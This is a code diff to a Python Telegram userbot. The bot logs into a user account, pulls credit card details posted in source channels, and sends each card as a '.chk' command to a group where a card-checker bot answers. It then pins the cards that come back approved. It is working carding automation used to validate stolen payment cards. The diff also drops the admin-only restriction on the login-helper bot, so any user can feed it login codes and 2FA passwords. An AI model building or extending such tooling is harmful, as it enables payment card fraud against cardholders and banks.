@@ -15,9 +15,6 @@ BOT_TOKEN = os.environ['BOT_TOKEN']
 PHONE_NUMBER = os.environ['PHONE_NUMBER']
 TARGET_GROUP = os.environ['TARGET_GROUP']
 
-# DIRECT USER ID - YAHAN APNA USER ID DALDO
-ADMIN_USER_ID = 5958404026  # REPLACE WITH YOUR ACTUAL USER ID
-
 SOURCE_CHANNELS = [
     int(os.environ['CHANNEL_1']),
     int(os.environ['CHANNEL_2'])
@@ -30,193 +27,95 @@ PROCESSED_FILE = 'processed_messages.json'
 posted_count = 0
 pinned_count = 0
 
-# Login state management
-class LoginManager:
-    def __init__(self):
-        self.phone_code = None
-        self.password = None
-        self.phone_code_event = asyncio.Event()
-        self.password_event = asyncio.Event()
-        self.user_client = None
-        
-    async def wait_for_phone_code(self):
-        """Wait for phone code from admin via bot"""
-        print("⏳ Waiting for phone code from admin...")
-        await self.phone_code_event.wait()
-        return self.phone_code
+# Global variables for login
+received_code = None
+received_password = None
+code_event = asyncio.Event()
+password_event = asyncio.Event()
+
+# Bot client
+bot = Client("login_helper", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+@bot.on_message(filters.private & filters.text)
+async def handle_manual_login(client, message):
+    global received_code, received_password
     
-    async def wait_for_password(self):
-        """Wait for password from admin via bot"""
-        print("⏳ Waiting for 2FA password from admin...")
-        await self.password_event.wait()
-        return self.password
-
-login_manager = LoginManager()
-
-# Bot client for receiving login codes - ONLY LISTENS TO ADMIN
-bot = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-
-@bot.on_message(filters.user(ADMIN_USER_ID) & filters.private & filters.text)
-async def handle_admin_login_codes(client, message):
-    """Receive login codes and passwords ONLY from admin"""
     text = message.text.strip()
+    print(f"📨 Received: {text}")
     
-    print(f"📨 Received from ADMIN {ADMIN_USER_ID}: {text}")
-    
-    # Welcome message
-    if text in ['/start', '/help', 'start', 'help']:
-        await message.reply(
-            "🤖 **Admin Login Assistant**\n\n"
-            "I'll help you login to your Telegram account.\n\n"
-            "🔢 **Please send:**\n"
-            "• 5-digit confirmation code (from Telegram)\n"
-            "• Or your 2FA password\n\n"
-            "📱 You'll receive a code on Telegram app shortly."
-        )
-        return
-    
-    # Check if it's a phone code (5 digits)
+    # Check for 5-digit code
     if text.isdigit() and len(text) == 5:
-        login_manager.phone_code = text
-        await message.reply("✅ **Code received!**\n\nLogging you in...")
-        login_manager.phone_code_event.set()
+        received_code = text
+        await message.reply(f"✅ Code **{text}** received! Processing login...")
+        code_event.set()
     
-    # Check if it's password
-    elif len(text) >= 4 and not text.isdigit():
-        login_manager.password = text
-        await message.reply("✅ **Password received!**\n\nCompleting login...")
-        login_manager.password_event.set()
+    # Check for password
+    elif len(text) > 3 and not text.isdigit():
+        received_password = text
+        await message.reply("✅ Password received! Completing login...")
+        password_event.set()
     
     else:
-        await message.reply(
-            "❌ **Invalid input**\n\n"
-            "Please send:\n"
-            "• 5-digit confirmation code\n"
-            "• Or your 2FA password\n\n"
-            "You should receive the code on Telegram app."
-        )
+        await message.reply("❌ Please send:\n• 5-digit code\n• Or password")
 
-# Ignore messages from other users
-@bot.on_message(filters.private & ~filters.user(ADMIN_USER_ID))
-async def handle_other_users(client, message):
-    await message.reply("❌ **Access Denied**\n\nThis bot is for admin use only.")
-
-async def perform_user_login():
-    """Perform user login with bot assistance"""
-    print("🚀 Starting user login process...")
+async def manual_login_process():
+    """Manual login with bot assistance"""
+    print("🚀 MANUAL LOGIN PROCESS STARTED")
+    print("📱 Please check Telegram for code")
     
-    # Start bot to receive codes
+    # Start bot
     await bot.start()
-    bot_me = await bot.get_me()
-    print(f"🤖 Bot started: @{bot_me.username}")
+    bot_user = await bot.get_me()
+    print(f"🤖 Bot ready: @{bot_user.username}")
+    print("💬 Send code to the bot when you receive it")
     
-    # Send welcome message to admin
-    try:
-        await bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=(
-                f"🔐 **Telegram Login Started**\n\n"
-                f"📱 Phone: `{PHONE_NUMBER}`\n"
-                f"🤖 Assistant: @{bot_me.username}\n\n"
-                f"Please wait for confirmation code..."
-            )
-        )
-    except Exception as e:
-        print(f"❌ Could not send message to admin: {e}")
-    
-    # Create user client
-    user_client = Client("user_session", api_id=API_ID, api_hash=API_HASH)
+    # User client
+    user_client = Client("user_account", api_id=API_ID, api_hash=API_HASH)
     
     try:
-        # Step 1: Connect and send code request
+        # Step 1: Request code
         await user_client.connect()
-        print("📲 Requesting login code from Telegram...")
-        sent_code = await user_client.send_code(PHONE_NUMBER)
-        print("✅ Code request sent!")
+        print("📲 Sending code request...")
+        code_info = await user_client.send_code(PHONE_NUMBER)
+        print("✅ Code sent to Telegram!")
         
-        # Notify admin via bot
-        try:
-            await bot.send_message(
-                chat_id=ADMIN_USER_ID,
-                text="📱 **Check Telegram!**\n\nYou should receive a 5-digit code. Send it to me here."
-            )
-        except:
-            pass
+        # Step 2: Wait for code via bot
+        print("⏳ Waiting for code...")
+        await code_event.wait()
         
-        # Step 2: Wait for phone code via bot (from admin only)
-        phone_code = await login_manager.wait_for_phone_code()
-        if not phone_code:
-            print("❌ No phone code received")
+        if not received_code:
+            print("❌ No code received")
             return None
+            
+        print(f"🔐 Using code: {received_code}")
         
-        print(f"🔢 Code received from admin: {phone_code}")
-        
-        # Step 3: Sign in with code
+        # Step 3: Sign in
         try:
             await user_client.sign_in(
                 phone_number=PHONE_NUMBER,
-                phone_code_hash=sent_code.phone_code_hash,
-                phone_code=phone_code
+                phone_code_hash=code_info.phone_code_hash,
+                phone_code=received_code
             )
             print("✅ Login successful!")
             
-            # Notify success to admin
-            try:
-                await bot.send_message(
-                    chat_id=ADMIN_USER_ID,
-                    text="🎉 **Login Successful!**\n\nStarting monitor..."
-                )
-            except:
-                pass
-            
         except SessionPasswordNeeded:
-            print("🔐 2FA password required")
+            print("🔑 Password required")
+            await bot.send_message("me", "🔑 Please send your 2FA password:")
             
-            # Request password from admin via bot
-            try:
-                await bot.send_message(
-                    chat_id=ADMIN_USER_ID,
-                    text="🔐 **2FA Password Required**\n\nPlease send your 2FA password:"
-                )
-            except:
-                pass
+            # Wait for password
+            await password_event.wait()
             
-            # Step 4: Wait for password via bot (from admin only)
-            password = await login_manager.wait_for_password()
-            if not password:
+            if not received_password:
                 print("❌ No password received")
                 return None
-            
-            # Step 5: Sign in with password
-            await user_client.check_password(password)
-            print("✅ 2FA authentication successful!")
-            
-            # Notify success to admin
-            try:
-                await bot.send_message(
-                    chat_id=ADMIN_USER_ID,
-                    text="🎉 **2FA Verified!**\n\nStarting monitor..."
-                )
-            except:
-                pass
+                
+            await user_client.check_password(received_password)
+            print("✅ Password accepted!")
         
-        # Return the logged-in client
-        login_manager.user_client = user_client
         return user_client
         
     except Exception as e:
-        print(f"❌ Login failed: {e}")
-        
-        # Notify error to admin
-        try:
-            await bot.send_message(
-                chat_id=ADMIN_USER_ID,
-                text=f"❌ **Login Failed**\n\nError: `{str(e)}`"
-            )
-        except:
-            pass
-        
-        await user_client.disconnect()
+        print(f"❌ Login error: {e}")
         return None
 
 class FileStorage:
@@ -280,7 +179,6 @@ async def pin_approved_message(client, message_id):
         return False
 
 async def cleanup_group_messages(client):
-    """Delete all messages except pinned ones"""
     try:
         deleted_count = 0
         print("🔄 Cleaning up group messages...")
@@ -304,33 +202,26 @@ async def send_and_wait_for_reply(client, cc_details):
     try:
         print(f"🔄 Sending CC: {cc_details}")
         
-        # Send message to bot
         sent_message = await client.send_message(TARGET_GROUP, f".chk {cc_details}")
         posted_count += 1
         print_stats()
         
-        # Wait for bot reply
-        print(f"⏳ Waiting {WAIT_FOR_REPLY} seconds for reply...")
         await asyncio.sleep(WAIT_FOR_REPLY)
         
-        # Check for replies
         async for message in client.get_chat_history(TARGET_GROUP, limit=50):
             if message.reply_to_message_id == sent_message.id:
                 message_text = message.text or ""
                 print(f"🤖 Bot reply: {message_text[:100]}...")
                 
-                # Check for APPROVED
                 if any(approved in message_text for approved in ["Approved ✅", "Status: Approved", "APPROVED", "Approved", "Card added", "Response: Card added", "Status: Approved ✅", "✅ Approved", "APPROVED ✅"]):
                     print("🎯 APPROVED detected!")
                     await pin_approved_message(client, message.id)
                     return "approved"
                 
-                # Check for declined
                 elif any(declined in message_text for declined in ["Declined", "DECLINED", "declined", "❌"]):
                     print("❌ DECLINED detected")
                     return "declined"
         
-        print("⏰ No reply received")
         return "no_reply"
         
     except Exception as e:
@@ -366,65 +257,61 @@ async def process_source_channel(client, channel_id):
 
 async def main():
     print("=" * 50)
-    print("🚀 TELEGRAM MONITOR - ADMIN BOT LOGIN")
+    print("🚀 TELEGRAM MONITOR - MANUAL LOGIN")
     print("=" * 50)
     print(f"📱 Phone: {PHONE_NUMBER}")
     print(f"🎯 Target: {TARGET_GROUP}")
-    print(f"👤 Admin ID: {ADMIN_USER_ID}")
     print("=" * 50)
     
     init_storage()
     
-    # Perform login with bot assistance (admin only)
-    user_client = await perform_user_login()
+    # Manual login
+    user_client = await manual_login_process()
     
     if not user_client:
-        print("❌ Login failed. Exiting.")
+        print("❌ Login failed")
         await bot.stop()
         return
     
     try:
         print("✅ Login successful! Starting monitor...")
         
-        # Get user info
         me = await user_client.get_me()
-        print(f"👤 User: {me.first_name} (@{me.username})")
+        print(f"👤 User: {me.first_name}")
         
-        # Stop bot (no longer needed)
+        # Stop bot
         await bot.stop()
-        print("🤖 Bot stopped")
         
         print("📊 Posted: 0 | Pinned: 0")
         
-        # Cleanup group
+        # Cleanup
         await cleanup_group_messages(user_client)
         
-        # Process existing messages
+        # Process channels
         for channel_id in SOURCE_CHANNELS:
             await process_source_channel(user_client, channel_id)
         
         print(f"\n✅ Ready | Posted: {posted_count} | Pinned: {pinned_count}")
-        print("🔍 Monitoring for new messages...")
+        print("🔍 Monitoring...")
         
-        # Message handler for new messages
+        # Message handler
         @user_client.on_message(filters.chat(SOURCE_CHANNELS))
-        async def handle_new_message(client, message):
+        async def handle_message(client, message):
             text = message.text or message.caption
             if not text:
                 return
             
-            message_signature = f"{message.chat.id}_{message.id}"
-            if is_message_processed(message_signature):
+            signature = f"{message.chat.id}_{message.id}"
+            if is_message_processed(signature):
                 return
             
-            cc_details = extract_cc_details(text)
-            if cc_details:
-                print(f"🆕 New CC: {cc_details}")
-                result = await send_and_wait_for_reply(client, cc_details)
-                mark_message_processed(message_signature, cc_details, result)
+            cc = extract_cc_details(text)
+            if cc:
+                print(f"🆕 New CC: {cc}")
+                result = await send_and_wait_for_reply(client, cc)
+                mark_message_processed(signature, cc, result)
                 await asyncio.sleep(NEXT_POST_DELAY)
         
-        # Keep running
         await user_client.run_until_disconnected()
         
     except Exception as e:
@@ -438,4 +325,4 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         print(f"\n🛑 Stopped | Posted: {posted_count} | Pinned: {pinned_count}")
     except Exception as e:
-        print(f"💥 Fatal error: {e}")
+        print(f"💥 Error: {e}")
